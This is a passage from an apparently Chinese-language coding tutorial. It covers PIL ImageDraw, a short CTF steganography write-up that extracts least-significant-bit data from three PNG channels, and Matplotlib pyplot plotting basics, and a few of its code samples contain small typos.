class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="imagedraw"><a class="markdownIt-Anchor" href="#imagedraw"></a> <strong>ImageDraw</strong></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> ImageDrawpic <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span>RGB<span class="token punctuation">,</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>ImageDraw<span class="token punctuation">(</span>pic<span class="token punctuation">)</span>  <span class="token comment">#创建绘画对象</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>参数：</p><p>fill = fillColor ，填充颜色<br>outline = outlineColor ， 边框颜色</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">draw<span class="token punctuation">.</span>rectangle<span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>y1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>y2<span class="token punctuation">)</span><span class="token punctuation">,</span>fill <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span>outline <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#画一个矩形，必填参数为坐标，第一第二个为起始点坐标，第三第四个为终点坐标</span>draw<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> Hello<span class="token punctuation">,</span> fill<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token comment">#画文字，文本左上角为x y坐标数据</span>draw<span class="token punctuation">.</span>line<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#画一条直线</span>draw<span class="token punctuation">.</span>line<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#画多条直线，每条线的起点坐标就是上一条线的终点坐标，此例子就是4条直线围成一个正方形</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h3><h4 id="天翼杯-2021rrrgggbbb"><a class="markdownIt-Anchor" href="#天翼杯-2021rrrgggbbb"></a> [天翼杯 2021]rrrgggbbb</h4><p>分别用StegSolve查看之后，发现分别r0、g0、b0通道的上方有像素点点。</p><p>抽出，发现``BPG<code>头，并且有</code>THE END`标志</p><p>需要把<code>THE END</code>标志及其之后的内容删掉</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imager<span class="token operator">=</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rrr.png"</span><span class="token punctuation">)</span>g<span class="token operator">=</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"ggg.png"</span><span class="token punctuation">)</span>b<span class="token operator">=</span>Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"bbb.png"</span><span class="token punctuation">)</span>height <span class="token operator">=</span> r<span class="token punctuation">.</span>heightwidth <span class="token operator">=</span> r<span class="token punctuation">.</span>widthr_list <span class="token operator">=</span> <span class="token string">""</span>g_list <span class="token operator">=</span> <span class="token string">""</span>b_list <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>        r_list <span class="token operator">+=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span>        g_list <span class="token operator">+=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span>                           b_list <span class="token operator">+=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> out<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out1.bpg'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>r_list<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>r_list<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>g_list<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        out<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>b_list<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   out<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>g<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>b<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>删去END后面的内容即可得到flag</p><h3 id="matplotlib-pyplot"><a class="markdownIt-Anchor" href="#matplotlib-pyplot"></a> Matplotlib Pyplot</h3><p>Pyplot 是matplotlib的子库。</p><p>Pyplot 包含一系列绘图函数的相关函数，每个函数会对当前的图像进行一些修改，例如：给图像加上标记，生新的图像，在图像中产生新的绘图区域等等。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>引入pyplot库 ，设置别名为plt。</p><ul><li><code>plot()</code>：用于绘制线图和散点图</li><li><code>scatter()</code>：用于绘制散点图</li><li><code>bar()</code>：用于绘制垂直条形图和水平条形图</li><li><code>hist()</code>：用于绘制直方图</li><li><code>pie()</code>：用于绘制饼图</li><li><code>imshow()</code>：用于绘制图像</li><li><code>subplots()</code>：用于创建子图</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 画单条线</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token punctuation">[</span>fmt<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token comment"># 画多条线</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token punctuation">[</span>fmt<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>x2<span class="token punctuation">]</span><span class="token punctuation">,</span> y2<span class="token punctuation">,</span> <span class="token punctuation">[</span>fmt2<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>     <span class="token comment"># 创建 y 中数据与 x 中对应值的二维线图，使用默认样式</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> <span class="token string">'bo'</span><span class="token punctuation">)</span> <span class="token comment"># 创建 y 中数据与 x 中对应值的二维线图，使用蓝色实心圈绘制</span>plot<span class="token punctuation">(</span>y<span class="token punctuation">)</span>      <span class="token comment"># x 的值为 0..N-1</span>plot<span class="token punctuation">(</span>y<span class="token punctuation">,</span> <span class="token string">'r+'</span><span class="token punctuation">)</span>   <span class="token comment"># 使用红色 + 号</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>颜色字符：</strong>‘b’ 蓝色，‘m’ 洋红色，‘g’ 绿色，‘y’ 黄色，‘r’ 红色，‘k’ 黑色，‘w’ 白色，‘c’ 青绿色，‘#008000’ RGB 颜色符串。多条曲线不指定颜色时，会自动选择不同颜色。</p><p><strong>线型参数：</strong>‘‐’ 实线，‘‐‐’ 破折线，‘‐.’ 点划线，‘:’ 虚线。</p><p><strong>标记字符：</strong>‘.’ 点标记，‘,’ 像素标记(极小点)，‘o’ 实心圈标记，‘v’ 倒三角标记，‘^’ 上三角标记，‘&gt;’ 右三角标记，‘&lt;’ 左三角标记…等等。</p><p>绘制直线时</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np <span class="token comment"># 引入多维数组</span>x<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只想绘制两个点</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np <span class="token comment"># 引入多维数组</span>x<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y，<span class="token string">'o'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果不指定x的值，那么将会根据y的值来设置</p><p>我们可以使用 pyplot 中的 grid() 方法来设置图表中的网格线。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">matplotlib<span class="token punctuation">.</span>pyplot<span class="token punctuation">.</span>grid<span class="token punctuation">(</span>b<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> which<span class="token operator">=</span><span class="token string">'major'</span><span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token string">'both'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token operator">//</span>b：可选，默认为 <span class="token boolean">None</span>，可以设置布尔值，true 为显示网格线，false 为不显示，如果设置 kwargs 参数，则值为 true。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">标题和轴标签        设置图片标题：plt.title("标题", fontsize=12, loc="center")//loc:left, right, center        设置轴标签：plt.xlabel("x轴标题", fontsize=12, loc="left")//loc: left, right, centerplt.ylabel("y轴标题", fontsize=12, loc="top")//loc: top, bottom, center设置横坐标轴刻度范围：plt.xticks(ticks, labels, rotation=90, fontsize=12)设置纵坐标轴刻度范围：plt.yticks(ticks, labels, rotation=90, fontsize=12)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="绘制多图"><a class="markdownIt-Anchor" href="#绘制多图"></a> 绘制多图</h4><p><strong>subplot()</strong> 方法在绘图时需要指定位置，<strong>subplots()</strong> 方法可以一次生成多个，在调用时只需要调用生成对象的 ax 即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token comment">#plot 1:</span>xpoints <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ypoints <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>xpoints<span class="token punctuation">,</span>ypoints<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"plot 1"</span><span class="token punctuation">)</span><span class="token comment">#plot 2:</span>x <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">"plot 2"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>suptitle<span class="token punctuation">(</span><span class="token string">"RUNOOB subplot Test"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>subplots()</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">matplotlib<span class="token punctuation">.</span>pyplot<span class="token punctuation">.</span>subplots<span class="token punctuation">(</span>nrows<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> ncols<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> sharex<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> sharey<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> squeeze<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> subplot_kw<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> gridspec_kw<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> fig_kw<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>nrows</strong>：默认为 1，设置图表的行数。</li><li><strong>ncols</strong>：默认为 1，设置图表的列数。</li><li><strong>sharex、sharey</strong>：设置 x、y 轴是否共享属性，默认为 false，可设置为 ‘none’、‘all’、‘row’ 或 ‘col’。 False 或 none 每个子图的 x 轴或 y 轴都是独立的，True 或 ‘all’：所有子图共享 x 轴或 y 轴，‘row’ 设置每个子图行共享一个 x 轴或 y 轴，‘col’：设置每个子图列共享一个 x 轴或 y 轴。</li><li><strong>squeeze</strong>：布尔值，默认为 True，表示额外的维度从返回的 Axes(轴)对象中挤出，对于 N<em>1 或 1</em>N 个子图，返回一个 1 维数组，对于 N*M，N&gt;1 和 M&gt;1 返回一个 2 维数组。如果设置为 False，则不进行挤压操作，返回一个元素为 Axes 实例的2维数组，即使它最终是1x1。</li><li><strong>subplot_kw</strong>：可选，字典类型。把字典的关键字传递给 add_subplot() 来创建每个子图。</li><li><strong>gridspec_kw</strong>：可选，字典类型。把字典的关键字传递给 GridSpec 构造函数创建子图放在网格里(grid)。</li><li>*<strong>*fig_kw</strong>：把详细的关键字参数传给 figure() 函数。</li></ul><pre class="line-numbers language-none"><code class="language-none">import matplotlib.pyplot as pltimport numpy as np# 创建一个2x2的子图fig, axs &#x3D; plt.subplots(nrows&#x3D;2, ncols&#x3D;2) # 在第一个子图中绘制正弦函数x &#x3D; np.linspace(0, 10, 100)y1 &#x3D; np.sin(x)axs[0, 0].plot(x, y1)axs[0, 0].set_title(&#39;Sin(x)&#39;) # 在第二个子图中绘制余弦函数y2 &#x3D; np.cos(x)axs[0, 1].plot(x, y2)axs[0, 1].set_title(&#39;Cos(x)&#39;) # 在第三个子图中绘制正切函数y3 &#x3D; np.tan(x)axs[1, 0].plot(x, y3)axs[1, 0].set_title(&#39;Tan(x)&#39;) # 在第四个子图中绘制正切函数的导数y4 &#x3D; 1 &#x2F; np.cos(x) ** 2axs[1, 1].plot(x, y4)axs[1, 1].set_title(&#39;Tan\&#39;(x)&#39;)# 调整布局以及子图之间的间距plt.tight_layout()# 显示图形plt.show()&#x2F;&#x2F;第 8~13 行在第一个子图 axs[0,0] 中绘制正弦函数，同时设置了标题为 ‘Sin(x)’。第 16~21 行在第二个子图 axs[0,1] 中绘制余弦函数，同时设置了标题为 ‘Cos(x)’。第 24~29 行在第三个子图 axs[1,0] 中绘制正切函数，同时设置了标题为 ‘Tan(x)’。第 32~37 行在第四个子图 axs[1,1] 中绘制正切函数的导数，同时设置了标题为 ‘Tan’(x)&#39;。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="散点图"><a class="markdownIt-Anchor" href="#散点图"></a> 散点图</h4><p>可以用plot或scatter</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltheight<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">170</span><span class="token punctuation">,</span><span class="token number">175</span><span class="token punctuation">,</span><span class="token number">186</span><span class="token punctuation">]</span>weight<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">]</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>heigth<span class="token punctuation">,</span>weight<span class="token punctuation">)</span>   <span class="token comment">#将x和y的数据变成列表</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="折线图"><a class="markdownIt-Anchor" href="#折线图"></a> 折线图</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx<span class="token operator">=</span>np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment">#从-10到10，等区间分成100份</span>y<span class="token operator">=</span>x<span class="token operator">**</span><span class="token number">2</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np x<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>y<span class="token operator">=</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="条形图"><a class="markdownIt-Anchor" href="#条形图"></a> 条形图</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token comment">#------绘制单变量条形图------</span>n<span class="token operator">=</span><span class="token number">5</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">50</span>，<span class="token number">60</span><span class="token punctuation">]</span>index<span class="token operator">=</span>np<span class="token punctuation">.</span>arrage<span class="token punctuation">(</span>n<span class="token punctuation">)</span>pl<span class="token operator">=</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>left<span class="token operator">=</span>index<span class="token punctuation">,</span>height<span class="token operator">=</span>y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>  <span class="token comment">#left表示横坐标从0到5，高度为y，颜色为红色，宽度为0.5</span>pl<span class="token operator">=</span>plt<span class="token punctuation">.</span>bar<span class="token punctuation">(</span>left<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>bottow<span class="token operator">=</span>index<span class="token punctuation">,</span>width<span class="token operator">=</span>y<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>orientation<span class="token operator">=</span><span class="token string">'horizontal'</span><span class="token punctuation">)</span>  <span class="token comment">#left表示横坐标，bottow表示纵坐标，width表示宽度，颜色为红色，高度为0.5，方向为水平方向</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#多变量条形图</span>sales_BJ<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">69</span><span class="token punctuation">]</span>sales_SH<span class="token operator">=</span><span class="token punctuation">[</span><span class="token 